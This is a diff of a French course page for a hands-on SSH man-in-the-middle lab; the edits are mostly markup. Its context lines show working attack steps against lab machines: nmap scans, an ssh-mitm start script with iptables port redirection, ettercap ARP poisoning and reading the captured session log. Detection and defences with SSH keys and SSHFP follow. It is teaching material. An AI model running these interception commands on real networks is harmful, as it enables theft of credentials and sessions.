@@ -7,7 +7,7 @@
 <meta name="description" content="Le TP de l'activité MITM sur SSH, pas à pas : les machines du lab, la première connexion TOFU, la reconnaissance nmap, la mise en place de ssh-mitm (routage, redirection de port), l'ARP spoofing avec ettercap, la preuve par capture, la détection du changement de clé, puis la partie 2 : connexion par clé ECDSA, agent SSH, échec du MITM et empreintes publiées dans le DNS (SSHFP). Les 28 questions corrigées à leur place.">
 <meta name="theme-color" content="#FDF5E6">
 <script>try{var S=JSON.parse(localStorage.getItem("bts-ciel")||"{}"),SOMBRES=["dark","emerald","ocean","mocha","nordic","carbon","rosewood","sunset","starry","aurora","midnight","amoled","voxel","pixel","terminal","matrix","crt","midgar","determination","velours","neon-lime"],d=document.documentElement,T=("theme" in S)?S.theme:"bloc-notes",n=T?SOMBRES.indexOf(T)>-1:matchMedia("(prefers-color-scheme: dark)").matches;d.dataset.theme=T||(n?"dark":"light");d.dataset.sombre=n?"1":"0";d.dataset.taille=S.taille||"normal";d.dataset.largeur=S.largeur||"normal";d.dataset.police=S.police||"systeme";d.dataset.interligne=S.interligne||"normal";d.dataset.anim=S.anim===0?"0":"1";d.dataset.style=S.style||"lanceur";var W=(S.style==="monde"||S.style==="ile")?S.style:"";if(W&&/(^|\/)(index\.html)?$/.test(location.pathname)&&sessionStorage.getItem("ciel-monde")!=="1"){sessionStorage.setItem("ciel-monde","1");location.replace(W+"/index.html")}d.dataset.curseur=S.curseur===0?"0":"1"}catch(e){}</script><script>try{if(window.self!==window.top)document.documentElement.dataset.encadre="1"}catch(e){document.documentElement.dataset.encadre="1"}</script><script>(function(){var d=document.documentElement;if(d.dataset.anim!=="0"&&d.dataset.encadre!=="1"&&window.matchMedia&&matchMedia("(max-width: 760px) and (prefers-reduced-motion: no-preference)").matches){var s=document.createElement("style");s.textContent="@view-transition{navigation:auto}";document.head.appendChild(s)}function g(v){if(!v)return;[v.ready,v.finished,v.updateCallbackDone].forEach(function(p){if(p&&p.catch)p.catch(function(){})})}addEventListener("pagereveal",function(e){g(e.viewTransition)});addEventListener("pageswap",function(e){g(e.viewTransition)})})()</script>
-<link rel="stylesheet" href="../../assets/fiche.css?v=16a7fc5c">
+<link rel="stylesheet" href="../../assets/fiche.css?v=a43b5e2f">
 </head>
 <body data-matiere="reseau">
 <div class="page">
@@ -79,7 +79,7 @@ docker ps                   # doit en montrer 4</code></pre></div>
 
   <div class="encart outils">
     <div class="titre">🔌 Les commandes de base, quand on les oublie</div>
-    <div class="bloc-code" data-fam="bash" style="--car:74"><span class="langue">bash</span><pre><code><span class="j-fn">docker</span> ps                      <span class="j-com"># les conteneurs qui TOURNENT</span>
+    <div class="bloc-code" data-fam="bash" data-plie style="--car:74"><span class="langue">bash</span><pre><code><span class="j-fn">docker</span> ps                      <span class="j-com"># les conteneurs qui TOURNENT</span>
 <span class="j-fn">docker</span> ps <span class="j-att">-a</span>                   <span class="j-com"># TOUS, meme ceux qui sont arretes</span>
 <span class="j-fn">docker</span> start $(docker ps <span class="j-att">-aq</span>)  <span class="j-com"># relancer TOUS les conteneurs arretes</span>
 <span class="j-fn">bash</span> gestion_lab1.sh <span class="j-att">-l</span>        <span class="j-com"># ou, propre : relancer tout le lab</span>
@@ -163,7 +163,7 @@ docker ps                   # doit en montrer 4</code></pre></div>
     <label class="tp-etape"><input type="checkbox"><span class="lib">Sur le <strong>serveur</strong>, vérifier que le service OpenSSH est installé et démarré.</span></label>
   </div>
 
-  <div class="bloc-code" data-machine="serveur" style="--car:64"><span class="langue">serveur · srvssh</span><pre><code>dpkg -l | grep openssh-server     # installe ?
+  <div class="bloc-code" data-machine="serveur" data-plie style="--car:64"><span class="langue">serveur · srvssh</span><pre><code>dpkg -l | grep openssh-server     # installe ?
 systemctl status ssh              # demarre ? (ou sshd)
 ss -ltnp | grep :22               # ecoute bien sur le port 22 ?</code></pre></div>
 
@@ -176,7 +176,7 @@ ss -ltnp | grep :22               # ecoute bien sur le port 22 ?</code></pre></d
       <div class="titre">✅ Réponse</div>
       <button type="button" data-ouvrir="Afficher la réponse" data-fermer="Masquer la réponse">Afficher la réponse</button>
       <div class="reponse">
-        <div class="bloc-code" data-fam="bash" style="--car:55"><span class="langue">terminal</span><pre><code><span class="j-fn">dpkg</span> <span class="j-att">-l</span> | grep openssh-server     <span class="j-com"># installe ?</span>
+        <div class="bloc-code" data-fam="bash" data-plie style="--car:55"><span class="langue">terminal</span><pre><code><span class="j-fn">dpkg</span> <span class="j-att">-l</span> | grep openssh-server     <span class="j-com"># installe ?</span>
 <span class="j-fn">systemctl</span> status ssh              <span class="j-com"># demarre ? (ou sshd)</span></code></pre></div><p>La première liste les paquets installés et filtre sur <code>openssh-server</code> ; la seconde interroge le gestionnaire de services sur l'état du démon SSH (actif, arrêté, au démarrage).</p>
       </div>
     </div>
@@ -204,7 +204,7 @@ ss -ltnp | grep :22               # ecoute bien sur le port 22 ?</code></pre></d
 
   <div class="bloc-code" data-machine="client" style="--car:32"><span class="langue">client · clissh</span><pre><code>ssh etuciel@srvssh.local.ciel.fr</code></pre></div>
 
-  <div class="bloc-code" data-machine="sortie" style="--car:85"><span class="langue">sortie observée · 1ʳᵉ connexion</span><pre><code>The authenticity of host 'srvssh.local.ciel.fr (192.168.56.10)' can't be established.
+  <div class="bloc-code" data-machine="sortie" data-plie style="--car:85"><span class="langue">sortie observée · 1ʳᵉ connexion</span><pre><code>The authenticity of host 'srvssh.local.ciel.fr (192.168.56.10)' can't be established.
 ED25519 key fingerprint is SHA256:IPIxEKxsYHPP3i7iMiZZXLYUoW9viLwSfF39MNoWIM4.
 Are you sure you want to continue connecting (yes/no)?</code></pre></div>
 
@@ -282,7 +282,7 @@ Are you sure you want to continue connecting (yes/no)?</code></pre></div>
     <label class="tp-etape"><input type="checkbox"><span class="lib">Depuis <strong>kali</strong>, balayer le sous-réseau, puis relever les versions des services sur les hôtes trouvés.</span></label>
   </div>
 
-  <div class="bloc-code" data-machine="kali" style="--car:55"><span class="langue">attaquant · kali</span><pre><code>nmap -sP 192.168.56.0/24     # quels hotes sont allumes
+  <div class="bloc-code" data-machine="kali" data-plie style="--car:55"><span class="langue">attaquant · kali</span><pre><code>nmap -sP 192.168.56.0/24     # quels hotes sont allumes
 nmap -sV 192.168.56.10       # le serveur SSH
 nmap -sV 192.168.56.11       # le client
 nmap -sV 192.168.56.254      # la passerelle</code></pre></div>
@@ -300,7 +300,7 @@ Service Info: OS: Linux</code></pre></div>
       <div class="titre">✅ Réponse</div>
       <button type="button" data-ouvrir="Afficher la réponse" data-fermer="Masquer la réponse">Afficher la réponse</button>
       <div class="reponse">
-        <div class="bloc-code" data-fam="bash" style="--car:76"><span class="langue">terminal</span><pre><code><span class="j-fn">nmap</span> <span class="j-att">-sP</span> <span class="j-num">192.168</span>.<span class="j-num">56.0</span>/<span class="j-num">24</span>     <span class="j-com"># quels hotes sont allumes</span>
+        <div class="bloc-code" data-fam="bash" data-plie style="--car:76"><span class="langue">terminal</span><pre><code><span class="j-fn">nmap</span> <span class="j-att">-sP</span> <span class="j-num">192.168</span>.<span class="j-num">56.0</span>/<span class="j-num">24</span>     <span class="j-com"># quels hotes sont allumes</span>
 <span class="j-fn">nmap</span> <span class="j-att">-sV</span> <span class="j-num">192.168</span>.<span class="j-num">56.10</span>       <span class="j-com"># quels ports, quels services, quelles versions</span></code></pre></div><p>Le premier scan dresse la <strong>liste des machines actives</strong> sur le réseau (découverte d'hôtes). Le second révèle, pour une machine, les <strong>ports ouverts</strong>, les <strong>services</strong> qui écoutent et souvent leur <strong>version précise</strong> (par exemple <code>OpenSSH 9.2p1</code>).</p>
 <p>L'attaquant sait alors quoi viser, ici, le port 22/SSH, et peut chercher des failles connues de cette version.</p>
       </div>
@@ -369,14 +369,14 @@ Service Info: OS: Linux</code></pre></div>
   <div class="tp-etapes">
     <label class="tp-etape"><input type="checkbox"><span class="lib">Sur <strong>kali</strong>, installer <code>ssh-mitm</code> et créer les deux répertoires de travail.</span></label>
   </div>
-  <div class="bloc-code" data-machine="kali" style="--car:49"><span class="langue">attaquant · kali</span><pre><code>sudo pip install ssh-mitm --break-system-packages
+  <div class="bloc-code" data-machine="kali" data-plie style="--car:49"><span class="langue">attaquant · kali</span><pre><code>sudo pip install ssh-mitm --break-system-packages
 mkdir -p ~/ssh-mitm
 sudo mkdir -p /home/ssh-mitm</code></pre></div>
 
   <div class="tp-etapes">
     <label class="tp-etape"><input type="checkbox"><span class="lib">Créer <code>~/ssh-mitm/start.sh</code> (avec <code>nano</code>, enregistrer par <code>Ctrl+O</code> puis quitter par <code>Ctrl+X</code>).</span></label>
   </div>
-  <div class="bloc-code" data-machine="kali" style="--car:92"><span class="langue">kali · ~/ssh-mitm/start.sh</span><pre><code>#!/bin/bash
+  <div class="bloc-code" data-machine="kali" data-plie style="--car:92"><span class="langue">kali · ~/ssh-mitm/start.sh</span><pre><code>#!/bin/bash
 sysctl -w net.ipv4.ip_forward=1
 iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 10022
 ssh-mitm server --remote-host 192.168.56.10 2>&1 | tee -a /home/ssh-mitm/shell_session_0.txt</code></pre></div>
@@ -392,7 +392,7 @@ sysctl -w net.ipv4.ip_forward=0</code></pre></div>
   <div class="tp-etapes">
     <label class="tp-etape"><input type="checkbox"><span class="lib">Rendre les scripts exécutables et démarrer l'interception.</span></label>
   </div>
-  <div class="bloc-code" data-machine="kali" style="--car:47"><span class="langue">attaquant · kali</span><pre><code>chmod +x ~/ssh-mitm/start.sh ~/ssh-mitm/stop.sh
+  <div class="bloc-code" data-machine="kali" data-plie style="--car:47"><span class="langue">attaquant · kali</span><pre><code>chmod +x ~/ssh-mitm/start.sh ~/ssh-mitm/stop.sh
 cd ~/ssh-mitm
 sudo ./start.sh</code></pre></div>
 
@@ -414,7 +414,7 @@ sudo ./start.sh</code></pre></div>
   <div class="tp-etapes">
     <label class="tp-etape"><input type="checkbox"><span class="lib">Dans un <strong>second terminal sur kali</strong>, vérifier l'écoute sur le port 10022 et les règles de redirection.</span></label>
   </div>
-  <div class="bloc-code" data-machine="kali" style="--car:65"><span class="langue">kali · 2ᵉ terminal</span><pre><code>ss -ltnp                         # (un L minuscule : "listening")
+  <div class="bloc-code" data-machine="kali" data-plie style="--car:65"><span class="langue">kali · 2ᵉ terminal</span><pre><code>ss -ltnp                         # (un L minuscule : "listening")
 sudo iptables -t nat -L -n -v</code></pre></div>
   <article class="exo">
     <h3><span class="no">12</span>Q12 <span class="niveau n2">Moyen</span></h3>
@@ -425,7 +425,7 @@ sudo iptables -t nat -L -n -v</code></pre></div>
       <div class="titre">✅ Réponse</div>
       <button type="button" data-ouvrir="Afficher la réponse" data-fermer="Masquer la réponse">Afficher la réponse</button>
       <div class="reponse">
-        <div class="bloc-code" data-fam="bash" style="--car:76"><span class="langue">terminal</span><pre><code><span class="j-fn">iptables</span> <span class="j-att">-t</span> nat <span class="j-att">-A</span> PREROUTING <span class="j-att">-p</span> tcp <span class="j-att">--dport</span> <span class="j-num">22</span> <span class="j-att">-j</span> REDIRECT <span class="j-att">--to-ports</span> <span class="j-num">10022</span></code></pre></div><p>Relayer ne suffit pas : pour <strong>intercepter le contenu</strong> d'une session SSH, l'attaquant doit faire passer le flux par <strong>son propre outil</strong> d'interception, qui joue le serveur face au client.</p>
+        <div class="bloc-code" data-fam="bash" data-plie style="--car:76"><span class="langue">terminal</span><pre><code><span class="j-fn">iptables</span> <span class="j-att">-t</span> nat <span class="j-att">-A</span> PREROUTING <span class="j-att">-p</span> tcp <span class="j-att">--dport</span> <span class="j-num">22</span> <span class="j-att">-j</span> REDIRECT <span class="j-att">--to-ports</span> <span class="j-num">10022</span></code></pre></div><p>Relayer ne suffit pas : pour <strong>intercepter le contenu</strong> d'une session SSH, l'attaquant doit faire passer le flux par <strong>son propre outil</strong> d'interception, qui joue le serveur face au client.</p>
 <p>La redirection envoie tout ce qui arrive sur le port 22 vers le port local où cet outil écoute (10022). Sans elle, les paquets seraient simplement transmis, jamais déchiffrés par l'attaquant.</p>
       </div>
     </div>
@@ -464,7 +464,7 @@ sudo iptables -t nat -L -n -v</code></pre></div>
   <div class="tp-etapes">
     <label class="tp-etape"><input type="checkbox"><span class="lib">Sur <strong>kali</strong> (pendant que <code>start.sh</code> tourne), lancer l'empoisonnement ARP.</span></label>
   </div>
-  <div class="bloc-code" data-machine="kali" style="--car:65"><span class="langue">attaquant · kali</span><pre><code>sudo ettercap -i eth0 -T -M arp /192.168.56.10// /192.168.56.11//</code></pre></div>
+  <div class="bloc-code" data-machine="kali" data-plie style="--car:65"><span class="langue">attaquant · kali</span><pre><code>sudo ettercap -i eth0 -T -M arp /192.168.56.10// /192.168.56.11//</code></pre></div>
 
   <div class="tp-etapes">
     <label class="tp-etape"><input type="checkbox"><span class="lib">Pendant qu'ettercap fonctionne, réinspecter le cache ARP sur le <strong>client</strong> et le <strong>serveur</strong>, et comparer à l'état de référence.</span></label>
@@ -512,7 +512,7 @@ sudo iptables -t nat -L -n -v</code></pre></div>
        <strong>Wireshark</strong> ; choisir l'interface <code>eth0</code>.</p>
     <p>Si la capture est refusée (il faut être administrateur pour écouter la carte), autoriser
        une fois pour toutes les comptes ordinaires :</p>
-    <div class="bloc-code" data-fam="bash" style="--car:70"><span class="langue">bash</span><pre><code><span class="j-fn">sudo dpkg-reconfigure</span> wireshark-common
+    <div class="bloc-code" data-fam="bash" data-plie style="--car:70"><span class="langue">bash</span><pre><code><span class="j-fn">sudo dpkg-reconfigure</span> wireshark-common
 <span class="j-com"># repondre "Yes" a : Should non-superusers be able to capture packets?</span></code></pre></div>
   </div>
 
@@ -561,7 +561,7 @@ sudo iptables -t nat -L -n -v</code></pre></div>
   <div class="tp-etapes">
     <label class="tp-etape"><input type="checkbox"><span class="lib">Depuis le <strong>client</strong>, se connecter en SSH, accepter l'empreinte, et taper quelques commandes (session interceptée).</span></label>
   </div>
-  <div class="bloc-code" data-machine="client" style="--car:44"><span class="langue">client · session interceptée</span><pre><code>ssh etuciel@srvssh.local.ciel.fr
+  <div class="bloc-code" data-machine="client" data-plie style="--car:44"><span class="langue">client · session interceptée</span><pre><code>ssh etuciel@srvssh.local.ciel.fr
 # repondre "yes" puis saisir le mot de passe
 sudo cat /etc/shadow
 sudo iptables -L</code></pre></div>
@@ -569,7 +569,7 @@ sudo iptables -L</code></pre></div>
   <div class="tp-etapes">
     <label class="tp-etape"><input type="checkbox"><span class="lib">Sur <strong>kali</strong>, arrêter ettercap (touche <code>q</code>), lancer <code>stop.sh</code>, puis lire le journal capturé.</span></label>
   </div>
-  <div class="bloc-code" data-machine="kali" style="--car:43"><span class="langue">attaquant · kali</span><pre><code>cd ~/ssh-mitm
+  <div class="bloc-code" data-machine="kali" data-plie style="--car:43"><span class="langue">attaquant · kali</span><pre><code>cd ~/ssh-mitm
 sudo ./stop.sh
 sudo cat /home/ssh-mitm/shell_session_0.txt</code></pre></div>
 
@@ -601,7 +601,7 @@ sudo cat /home/ssh-mitm/shell_session_0.txt</code></pre></div>
   <div class="bloc-code" data-machine="client" style="--car:32"><span class="langue">client · clissh</span><pre><code>sudo ip neigh flush all
 ssh etuciel@srvssh.local.ciel.fr</code></pre></div>
 
-  <div class="bloc-code" data-machine="sortie" style="--car:75"><span class="langue">sortie observée · alerte SSH</span><pre><code>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+  <div class="bloc-code" data-machine="sortie" data-plie style="--car:75"><span class="langue">sortie observée · alerte SSH</span><pre><code>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
@@ -635,7 +635,7 @@ Offending ED25519 key in /home/etuciel/.ssh/known_hosts:1</code></pre></div>
       <div class="titre">✅ Réponse</div>
       <button type="button" data-ouvrir="Afficher la réponse" data-fermer="Masquer la réponse">Afficher la réponse</button>
       <div class="reponse">
-        <p>Deux temps. <strong>D'abord traiter l'attaque</strong> : stopper l'ARP spoofing, nettoyer les caches ARP, et s'assurer qu'on parle bien au vrai serveur. <strong>Ensuite seulement</strong>, retirer l'ancienne entrée du client pour qu'il réapprenne la bonne clé :</p><div class="bloc-code" data-fam="bash" style="--car:72"><span class="langue">terminal</span><pre><code><span class="j-fn">ssh-keygen</span> <span class="j-att">-f</span> <span class="j-txt">"/home/etuciel/.ssh/known_hosts"</span> <span class="j-att">-R</span> <span class="j-txt">"srvssh.local.ciel.fr"</span></code></pre></div><p class="rap">Supprimer l'entrée <strong>sans avoir écarté l'attaque</strong> serait une faute : on ré-accepterait la clé de l'attaquant. L'avertissement n'est pas un obstacle à contourner, c'est une alerte à prendre au sérieux.</p>
+        <p>Deux temps. <strong>D'abord traiter l'attaque</strong> : stopper l'ARP spoofing, nettoyer les caches ARP, et s'assurer qu'on parle bien au vrai serveur. <strong>Ensuite seulement</strong>, retirer l'ancienne entrée du client pour qu'il réapprenne la bonne clé :</p><div class="bloc-code" data-fam="bash" data-plie style="--car:72"><span class="langue">terminal</span><pre><code><span class="j-fn">ssh-keygen</span> <span class="j-att">-f</span> <span class="j-txt">"/home/etuciel/.ssh/known_hosts"</span> <span class="j-att">-R</span> <span class="j-txt">"srvssh.local.ciel.fr"</span></code></pre></div><p class="rap">Supprimer l'entrée <strong>sans avoir écarté l'attaque</strong> serait une faute : on ré-accepterait la clé de l'attaquant. L'avertissement n'est pas un obstacle à contourner, c'est une alerte à prendre au sérieux.</p>
       </div>
     </div>
   </article>
@@ -656,7 +656,7 @@ Offending ED25519 key in /home/etuciel/.ssh/known_hosts:1</code></pre></div>
        est imprévisible : plus elle est haute, plus la clé est dure à deviner.</p>
     <p>En entreprise, on génère les clés sur une <strong>machine physique</strong>, qui a
        plusieurs sources de hasard indépendantes. Une machine virtuelle en a moins.</p>
-    <div class="bloc-code" data-fam="bash" style="--car:41"><span class="langue">bash</span><pre><code><span class="j-fn">cat</span> /proc/sys/kernel/random/entropy_avail
+    <div class="bloc-code" data-fam="bash" data-plie style="--car:41"><span class="langue">bash</span><pre><code><span class="j-fn">cat</span> /proc/sys/kernel/random/entropy_avail
 <span class="j-fn">uname</span> <span class="j-att">-r</span>     <span class="j-com"># la version du noyau</span></code></pre></div>
     <p class="rap">Le sujet dit qu'en dessous de 1000, le hasard manque. Sur un noyau récent
        (5.18 et plus), la valeur affichée reste <strong>256</strong> en permanence : le
@@ -667,7 +667,7 @@ Offending ED25519 key in /home/etuciel/.ssh/known_hosts:1</code></pre></div>
     <label class="tp-etape"><input type="checkbox"><span class="lib">Sur le <strong>serveur</strong>, autoriser la connexion par clé dans la configuration, puis redémarrer SSH.</span></label>
   </div>
   <div class="bloc-code" data-machine="serveur" style="--car:29"><span class="langue">serveur · srvssh</span><pre><code>sudoedit /etc/ssh/sshd_config</code></pre></div>
-  <div class="bloc-code" data-machine="serveur" style="--car:39"><span class="langue">serveur · /etc/ssh/sshd_config</span><pre><code>PubkeyAuthentication yes
+  <div class="bloc-code" data-machine="serveur" data-plie style="--car:39"><span class="langue">serveur · /etc/ssh/sshd_config</span><pre><code>PubkeyAuthentication yes
 AuthorizedKeysFile .ssh/authorized_keys</code></pre></div>
   <div class="bloc-code" data-machine="serveur" style="--car:24"><span class="langue">serveur · srvssh</span><pre><code>sudo service ssh restart</code></pre></div>
 
@@ -675,7 +675,7 @@ AuthorizedKeysFile .ssh/authorized_keys</code></pre></div>
     <label class="tp-etape"><input type="checkbox"><span class="lib">Sur le <strong>client</strong>, générer la paire de clés. <strong>Entrée</strong> pour garder l'emplacement proposé, puis la phrase de passe <code>TPMITMcerta</code>, deux fois.</span></label>
   </div>
   <div class="bloc-code" data-machine="client" style="--car:26"><span class="langue">client · clissh</span><pre><code>ssh-keygen -b 256 -t ecdsa</code></pre></div>
-  <div class="bloc-code" data-machine="sortie" style="--car:66"><span class="langue">sortie observée · ssh-keygen</span><pre><code>Generating public/private ecdsa key pair.
+  <div class="bloc-code" data-machine="sortie" data-plie style="--car:66"><span class="langue">sortie observée · ssh-keygen</span><pre><code>Generating public/private ecdsa key pair.
 Enter file in which to save the key (/home/etuciel/.ssh/id_ecdsa):
 Enter passphrase (empty for no passphrase):
 Enter same passphrase again:
@@ -743,7 +743,7 @@ cat ~/.ssh/id_ecdsa.pub</code></pre></div>
       <div class="reponse">
         <p>Le dossier contient <code>id_ecdsa</code> (droits <code>-rw-------</code>, soit 600 : toi seul), <code>id_ecdsa.pub</code> (<code>-rw-r--r--</code>, 644 : lisible par tous) et <code>known_hosts</code>.</p>
         <p>La clé publique tient sur <strong>une ligne</strong>, en trois morceaux :</p>
-        <div class="bloc-code" style="--car:46"><span class="langue">sortie</span><pre><code>ecdsa-sha2-nistp256 AAAAE2Vj... etuciel@clissh</code></pre></div>
+        <div class="bloc-code" data-plie style="--car:46"><span class="langue">sortie</span><pre><code>ecdsa-sha2-nistp256 AAAAE2Vj... etuciel@clissh</code></pre></div>
         <p>Le type de clé, la clé elle-même en base 64, puis un commentaire : le compte et la machine qui l'ont créée.</p>
       </div>
     </div>
@@ -753,7 +753,7 @@ cat ~/.ssh/id_ecdsa.pub</code></pre></div>
   <div class="tp-etapes">
     <label class="tp-etape"><input type="checkbox"><span class="lib">Depuis le <strong>client</strong>, copier la clé publique dans <code>authorized_keys</code> sur le serveur, puis se reconnecter : c'est la <strong>phrase de passe</strong> qui est demandée, plus le mot de passe.</span></label>
   </div>
-  <div class="bloc-code" data-machine="client" style="--car:63"><span class="langue">client · clissh</span><pre><code>ssh-copy-id -i ~/.ssh/id_ecdsa.pub etuciel@srvssh.local.ciel.fr
+  <div class="bloc-code" data-machine="client" data-plie style="--car:63"><span class="langue">client · clissh</span><pre><code>ssh-copy-id -i ~/.ssh/id_ecdsa.pub etuciel@srvssh.local.ciel.fr
 ssh etuciel@srvssh.local.ciel.fr</code></pre></div>
 
   <div class="encart piege">
@@ -767,7 +767,7 @@ ssh etuciel@srvssh.local.ciel.fr</code></pre></div>
   <div class="tp-etapes">
     <label class="tp-etape"><input type="checkbox"><span class="lib">Sur le <strong>serveur</strong>, désactiver la connexion par mot de passe : décommenter la directive, la passer à <code>no</code>, puis redémarrer SSH.</span></label>
   </div>
-  <div class="bloc-code" data-machine="serveur" style="--car:44"><span class="langue">serveur · /etc/ssh/sshd_config</span><pre><code># Autorisation de connexion par mot de passe
+  <div class="bloc-code" data-machine="serveur" data-plie style="--car:44"><span class="langue">serveur · /etc/ssh/sshd_config</span><pre><code># Autorisation de connexion par mot de passe
 PasswordAuthentication no</code></pre></div>
   <div class="bloc-code" data-machine="serveur" style="--car:24"><span class="langue">serveur · srvssh</span><pre><code>sudo service ssh restart</code></pre></div>
 
@@ -791,7 +791,7 @@ chmod 600 ~/.ssh/id_ecdsa</code></pre></div>
       <button type="button" data-ouvrir="Afficher la réponse" data-fermer="Masquer la réponse">Afficher la réponse</button>
       <div class="reponse">
         <p>Le client <strong>refuse d'utiliser</strong> la clé :</p>
-        <div class="bloc-code" style="--car:50"><span class="langue">sortie</span><pre><code>WARNING: UNPROTECTED PRIVATE KEY FILE!
+        <div class="bloc-code" data-plie style="--car:50"><span class="langue">sortie</span><pre><code>WARNING: UNPROTECTED PRIVATE KEY FILE!
 Permissions 0644 for '/home/etuciel/.ssh/id_ecdsa'
 are too open.
 This private key will be ignored.</code></pre></div>
@@ -826,7 +826,7 @@ This private key will be ignored.</code></pre></div>
        Garde donc <strong>la session actuelle ouverte</strong> pour remettre 600 depuis elle.</p>
     <p>Si elle s'est fermée, passe par l'hôte : <code>docker ps</code> pour trouver le nom du
        conteneur du serveur, puis :</p>
-    <div class="bloc-code" data-fam="bash" style="--car:46"><span class="langue">hôte</span><pre><code><span class="j-fn">docker</span> exec <span class="j-att">-it</span> NOM_DU_CONTENEUR \
+    <div class="bloc-code" data-fam="bash" data-plie style="--car:46"><span class="langue">hôte</span><pre><code><span class="j-fn">docker</span> exec <span class="j-att">-it</span> NOM_DU_CONTENEUR \
 <span class="j-fn">  chmod</span> <span class="j-num">600</span> /home/etuciel/.ssh/authorized_keys</code></pre></div>
   </div>
 
@@ -938,7 +938,7 @@ sudo ./stop.sh</code></pre></div>
   <div class="tp-etapes">
     <label class="tp-etape"><input type="checkbox"><span class="lib">D'abord à la main : afficher l'empreinte de la clé d'hôte sur le <strong>serveur</strong>, et la comparer à celle que le <strong>client</strong> affiche à la première connexion.</span></label>
   </div>
-  <div class="bloc-code" data-machine="serveur" style="--car:50"><span class="langue">serveur · srvssh</span><pre><code>ssh-keygen -l -f /etc/ssh/ssh_host_ecdsa_key.pub
+  <div class="bloc-code" data-machine="serveur" data-plie style="--car:50"><span class="langue">serveur · srvssh</span><pre><code>ssh-keygen -l -f /etc/ssh/ssh_host_ecdsa_key.pub
 ssh-keygen -l -f /etc/ssh/ssh_host_ed25519_key.pub</code></pre></div>
   <div class="bloc-code" data-machine="client" style="--car:32"><span class="langue">client · clissh</span><pre><code>ssh etuciel@srvssh.local.ciel.fr</code></pre></div>
   <div class="encart piege">
@@ -994,7 +994,7 @@ srvssh IN SSHFP 4 2 88efa67b...</code></pre></div>
   <div class="tp-etapes">
     <label class="tp-etape"><input type="checkbox"><span class="lib">Retrouver le fichier de zone, y coller les six lignes <strong>à la fin</strong>, et augmenter le numéro de série (<code>serial</code>) de la zone.</span></label>
   </div>
-  <div class="bloc-code" data-machine="serveur" style="--car:42"><span class="langue">serveur · srvssh</span><pre><code>grep -rn "file" /etc/bind/named.conf.local
+  <div class="bloc-code" data-machine="serveur" data-plie style="--car:42"><span class="langue">serveur · srvssh</span><pre><code>grep -rn "file" /etc/bind/named.conf.local
 sudoedit /var/named/db.local.ciel.fr</code></pre></div>
   <p>Le <code>grep</code> montre le chemin du fichier de zone déclaré. Le sujet le met dans
      <code>/var/named/</code> : si ton lab le range ailleurs, prends le chemin affiché.</p>
@@ -1002,7 +1002,7 @@ sudoedit /var/named/db.local.ciel.fr</code></pre></div>
   <div class="tp-etapes">
     <label class="tp-etape"><input type="checkbox"><span class="lib">Vérifier la zone, puis recharger le DNS.</span></label>
   </div>
-  <div class="bloc-code" data-machine="serveur" style="--car:62"><span class="langue">serveur · srvssh</span><pre><code>sudo named-checkzone local.ciel.fr /var/named/db.local.ciel.fr
+  <div class="bloc-code" data-machine="serveur" data-plie style="--car:62"><span class="langue">serveur · srvssh</span><pre><code>sudo named-checkzone local.ciel.fr /var/named/db.local.ciel.fr
 sudo rndc reload</code></pre></div>
   <p><code>named-checkzone</code> doit répondre <code>OK</code>. Une erreur dans la zone, et
      c'est tout le domaine qui ne répond plus.</p>
@@ -1011,8 +1011,8 @@ sudo rndc reload</code></pre></div>
   <div class="tp-etapes">
     <label class="tp-etape"><input type="checkbox"><span class="lib">Sur le <strong>client</strong>, se connecter en demandant la vérification par le DNS.</span></label>
   </div>
-  <div class="bloc-code" data-machine="client" style="--car:56"><span class="langue">client · clissh</span><pre><code>ssh -o VerifyHostKeyDNS=yes etuciel@srvssh.local.ciel.fr</code></pre></div>
-  <div class="bloc-code" data-machine="sortie" style="--car:43"><span class="langue">sortie attendue</span><pre><code>Matching host key fingerprint found in DNS.</code></pre></div>
+  <div class="bloc-code" data-machine="client" data-plie style="--car:56"><span class="langue">client · clissh</span><pre><code>ssh -o VerifyHostKeyDNS=yes etuciel@srvssh.local.ciel.fr</code></pre></div>
+  <div class="bloc-code" data-machine="sortie" data-plie style="--car:43"><span class="langue">sortie attendue</span><pre><code>Matching host key fingerprint found in DNS.</code></pre></div>
 
   <div class="tp-etapes">
     <label class="tp-etape"><input type="checkbox"><span class="lib">Pour que la vérification se fasse à <strong>chaque</strong> connexion, l'écrire dans la configuration du client.</span></label>
@@ -1070,7 +1070,7 @@ sudo rndc reload</code></pre></div>
 <nav class="voisins" aria-label="Chapitres voisins"><a class="prec" href="../19-wsl-containers/cours.html"><span>Chapitre précédent</span><b>WSL Containers (bonus)</b></a><span class="vide"></span></nav>
 </main>
 </div>
-<script src="../../assets/fiche.js?v=16a7fc5c"></script>
-<script src="../../assets/app.js?v=16a7fc5c"></script>
+<script src="../../assets/fiche.js?v=a43b5e2f"></script>
+<script src="../../assets/app.js?v=a43b5e2f"></script>
 </body>
 </html>
